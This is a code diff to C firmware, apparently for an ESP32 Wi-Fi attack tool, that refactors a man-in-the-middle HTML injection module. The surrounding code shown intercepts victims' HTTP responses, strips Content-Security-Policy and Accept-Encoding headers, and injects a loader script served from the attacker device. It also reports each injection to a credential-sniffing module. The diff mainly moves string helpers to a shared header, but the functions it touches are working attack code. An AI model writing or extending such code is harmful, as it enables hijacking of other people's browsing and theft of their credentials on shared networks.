@@ -1,5 +1,6 @@
 #include "wlan_html_inject.h"
 #include "wlan_cred_sniff.h"
+#include "wlan_parse_helpers.h"
 
 #include <esp_log.h>
 #include <stdio.h>
@@ -12,7 +13,6 @@
 #define ETHTYPE_IPV4 0x0800
 #define IPPROTO_TCP 6
 
-#define INJECT_CODE_MAX 96
 // Loader-Template: protocol-relative URL, damit der Browser das Schema von der
 // gemitm-ten Seite übernimmt (http auf http-Pages; https-Pages scheitern eh,
 // weil wir kein TLS sprechen). Pro Paket wird %%MY_IP%% gerendert. Resultat
@@ -64,11 +64,10 @@ typedef struct {
 static FlowEntry s_flow_cache[FLOW_CACHE_SIZE];
 static uint32_t s_flow_lru_counter = 0;
 
-// Inject-Payload (Loader-Template, fest). Producer im lwIP-tcpip_thread liest
-// s_inject_code_len (atomic acquire) und dann s_inject_code[0..len) — der
-// UI-Thread schreibt erst den Buffer, dann release-stored die Länge.
-static char s_inject_code[INJECT_CODE_MAX] = INJECT_LOADER;
-static volatile uint32_t s_inject_code_len = sizeof(INJECT_LOADER) - 1;
+// Inject-Payload (Loader-Template, konstant). Pro Response per render_template
+// in s_rendered ausgelöst, dabei %%MY_IP%% etc. ersetzt.
+static const char s_inject_code[] = INJECT_LOADER;
+#define S_INJECT_CODE_LEN ((int)(sizeof(s_inject_code) - 1))
 static volatile uint32_t s_my_ip = 0;
 
 // Raw User-Payload für /code-Endpoint. Atomic-store auf len gibt den Buffer
@@ -108,7 +107,6 @@ void wlan_html_inject_set_code(const char* code) {
     memcpy(s_user_payload, code, code_l);
     s_user_payload[code_l] = '\0';
     __atomic_store_n(&s_user_payload_len, code_l, __ATOMIC_RELEASE);
-    // s_inject_code bleibt der Loader — kein Re-Wrap nötig.
 }
 
 uint32_t wlan_html_inject_get_payload(char* out, uint32_t max_len) {
@@ -141,25 +139,6 @@ uint32_t wlan_html_inject_count_stripped(void) {
 
 static inline bool is_html_ws(uint8_t c) {
     return c == ' ' || c == '\t' || c == '\r' || c == '\n';
-}
-
-static bool ci_match(const uint8_t* a, const char* b, int n) {
-    for(int i = 0; i < n; i++) {
-        char x = (char)a[i];
-        char y = b[i];
-        if(x >= 'A' && x <= 'Z') x = (char)(x + 32);
-        if(y >= 'A' && y <= 'Z') y = (char)(y + 32);
-        if(x != y) return false;
-    }
-    return true;
-}
-
-static const uint8_t* ci_mem_find(const uint8_t* hay, int haylen, const char* needle) {
-    int nlen = (int)strlen(needle);
-    if(nlen <= 0 || haylen < nlen) return NULL;
-    for(int i = 0; i + nlen <= haylen; i++)
-        if(ci_match(hay + i, needle, nlen)) return hay + i;
-    return NULL;
 }
 
 // ---------------------------------------------------------------------------
@@ -213,7 +192,7 @@ static void recompute_tcp_csum(uint8_t* ip_hdr, int ip_total_len) {
 // ---------------------------------------------------------------------------
 
 static bool strip_accept_encoding(uint8_t* data, int data_len) {
-    const uint8_t* ae = ci_mem_find(data, data_len, "accept-encoding:");
+    const uint8_t* ae = wlan_ci_mem_find(data, data_len, "accept-encoding:");
     if(!ae) return false;
     int off = (int)(ae - data);
     int end = off;
@@ -249,7 +228,7 @@ static bool strip_csp(uint8_t* data, int data_len) {
         if(rlen != nlen) continue; // Programmierfehler
         int from = 0;
         while(from + nlen <= data_len) {
-            const uint8_t* found = ci_mem_find(data + from, data_len - from, csps[n].needle);
+            const uint8_t* found = wlan_ci_mem_find(data + from, data_len - from, csps[n].needle);
             if(!found) break;
             int off = (int)(found - data);
             memcpy(data + off, csps[n].replace, rlen);
@@ -273,7 +252,7 @@ static bool find_content_length(
     int* out_value_field_off,
     int* out_value_field_len,
     uint32_t* out_value) {
-    const uint8_t* cl = ci_mem_find(data, header_block_len, "Content-Length:");
+    const uint8_t* cl = wlan_ci_mem_find(data, header_block_len, "Content-Length:");
     if(!cl) return false;
     int after_colon = (int)(cl - data) + 15;
     int end = after_colon;
@@ -353,7 +332,6 @@ static int render_template(
                 }
             }
             if(var_len > 0) {
-                int prev_o = o;
                 if(var_len == 5 && memcmp(var_start, "MY_IP", 5) == 0) {
                     o = append_ip(out, out_max, o, my_ip);
                 } else if(var_len == 9 && memcmp(var_start, "VICTIM_IP", 9) == 0) {
@@ -368,8 +346,6 @@ static int render_template(
                     i++;
                     continue;
                 }
-                // (auch wenn Output durch Cap unverändert blieb, Variable konsumieren)
-                (void)prev_o;
                 i += 2 + var_len + 2; // "%%VAR%%"
                 continue;
             }
@@ -451,13 +427,13 @@ static FlowEntry* flow_cache_set(
 // "application/xhtml+xml" gelten als injectable. Kein Content-Type → false
 // (conservative — wenn der Server ihn nicht setzt, raten wir nicht).
 static bool is_html_content_type(const uint8_t* data, int header_block_len) {
-    const uint8_t* ct = ci_mem_find(data, header_block_len, "Content-Type:");
+    const uint8_t* ct = wlan_ci_mem_find(data, header_block_len, "Content-Type:");
     if(!ct) return false;
     int off = (int)(ct - data) + 13; // strlen("Content-Type:")
     while(off < header_block_len && (data[off] == ' ' || data[off] == '\t')) off++;
     int rem = header_block_len - off;
-    if(rem >= 9 && ci_match(data + off, "text/html", 9)) return true;
-    if(rem >= 21 && ci_match(data + off, "application/xhtml+xml", 21)) return true;
+    if(rem >= 9 && wlan_ci_match(data + off, "text/html", 9)) return true;
+    if(rem >= 21 && wlan_ci_match(data + off, "application/xhtml+xml", 21)) return true;
     return false;
 }
 
@@ -507,7 +483,7 @@ static int parse_http_status(const uint8_t* data, int data_len) {
 // landen ("<noscriptly" oder so).
 static bool is_noscript_open(const uint8_t* p, int avail) {
     if(avail < 10) return false;
-    if(!ci_match(p, "<noscript", 9)) return false;
+    if(!wlan_ci_match(p, "<noscript", 9)) return false;
     uint8_t c = p[9];
     return c == '>' || c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '/';
 }
@@ -522,12 +498,12 @@ static bool is_comment_open(const uint8_t* p, int avail) {
 static int skippable_block_len(const uint8_t* p, int avail) {
     if(avail < 4 || p[0] != '<') return -1;
     if(is_noscript_open(p, avail)) {
-        const uint8_t* close = ci_mem_find(p, avail, "</noscript>");
+        const uint8_t* close = wlan_ci_mem_find(p, avail, "</noscript>");
         if(close) return (int)(close - p) + 11; // strlen("</noscript>")
         return -1;
     }
     if(is_comment_open(p, avail)) {
-        const uint8_t* close = ci_mem_find(p, avail, "-->");
+        const uint8_t* close = wlan_ci_mem_find(p, avail, "-->");
         if(close) return (int)(close - p) + 3;
         return -1;
     }
@@ -608,7 +584,7 @@ static int find_inject_anchor(const uint8_t* data, int data_len) {
         int from = 0;
         while(from < data_len) {
             const uint8_t* tag =
-                ci_mem_find(data + from, data_len - from, anchors[t].name);
+                wlan_ci_mem_find(data + from, data_len - from, anchors[t].name);
             if(!tag) break;
             int tag_off = (int)(tag - data);
             int after = tag_off + anchors[t].len;
@@ -675,7 +651,7 @@ static int inject_after_anchor(
     if(icl <= 0) return 0;
     if(max_growth < icl) return 0;
 
-    const uint8_t* hdr_end_p = ci_mem_find(data, data_len, "\r\n\r\n");
+    const uint8_t* hdr_end_p = wlan_ci_mem_find(data, data_len, "\r\n\r\n");
     if(!hdr_end_p) return 0;
     int header_block_len = (int)(hdr_end_p - data);
     int body_off = header_block_len + 4;
@@ -758,7 +734,7 @@ bool wlan_html_inject_process_eth(uint8_t* eth, uint16_t* len_ptr, uint16_t buf_
         // skippen, sonst injecten wir Müll in JavaScript-Files o.ä.
         FlowEntry* flow;
         if(is_response_start) {
-            const uint8_t* hdr_end = ci_mem_find(data, data_len, "\r\n\r\n");
+            const uint8_t* hdr_end = wlan_ci_mem_find(data, data_len, "\r\n\r\n");
             int hdr_len = hdr_end ? (int)(hdr_end - data) : data_len;
             int status = parse_http_status(data, data_len);
             // Nur erfolgreiche Responses (2xx) injecten. 3xx-Redirects haben
@@ -792,17 +768,12 @@ bool wlan_html_inject_process_eth(uint8_t* eth, uint16_t* len_ptr, uint16_t buf_
         // nicht auf den, zu dem die aktuelle Response gehört.
         const char* host_buf = flow->host;
         const char* path_buf = flow->path;
-        uint32_t tmpl_len = __atomic_load_n(&s_inject_code_len, __ATOMIC_ACQUIRE);
-        int rendered_len = 0;
-        if(tmpl_len > 0) {
-            rendered_len = render_template(
-                s_rendered, INJECT_RENDERED_MAX,
-                s_inject_code, (int)tmpl_len,
-                dst_ip, host_buf, path_buf);
-        }
+        int rendered_len = render_template(
+            s_rendered, INJECT_RENDERED_MAX,
+            s_inject_code, S_INJECT_CODE_LEN,
+            dst_ip, host_buf, path_buf);
 
         bool injected_now = false;
-        const char* via = NULL;
 
         // CSP-Strip + growth-Inject am <head>-Anker sind nur auf Response-Start
         // Paketen sinnvoll. Folge-Pakete enthalten weder Header noch Anker-Tag.
@@ -818,7 +789,6 @@ bool wlan_html_inject_process_eth(uint8_t* eth, uint16_t* len_ptr, uint16_t buf_
                 data_len += g;
                 modified = true;
                 injected_now = true;
-                via = "growth";
             }
         }
 
@@ -829,7 +799,7 @@ bool wlan_html_inject_process_eth(uint8_t* eth, uint16_t* len_ptr, uint16_t buf_
             uint8_t* region = data;
             int region_len = data_len;
             if(is_response_start) {
-                const uint8_t* hdr_end = ci_mem_find(data, data_len, "\r\n\r\n");
+                const uint8_t* hdr_end = wlan_ci_mem_find(data, data_len, "\r\n\r\n");
                 if(hdr_end) {
                     int hdr_len = (int)(hdr_end - data) + 4;
                     region = data + hdr_len;
@@ -843,17 +813,15 @@ bool wlan_html_inject_process_eth(uint8_t* eth, uint16_t* len_ptr, uint16_t buf_
                    inject_via_compaction(region, region_len, s_rendered, rendered_len)) {
                     modified = true;
                     injected_now = true;
-                    via = "compact";
                 }
             }
         }
 
         if(injected_now) {
             __atomic_fetch_add(&s_injected, 1u, __ATOMIC_RELAXED);
-            (void)via;
             if(s_cred_sniff) {
                 wlan_cred_sniff_push_inject(
-                    s_cred_sniff, src_ip, dst_ip, dport, flow->host, flow->path);
+                    s_cred_sniff, src_ip, dst_ip, flow->host, flow->path);
             }
         }
     }
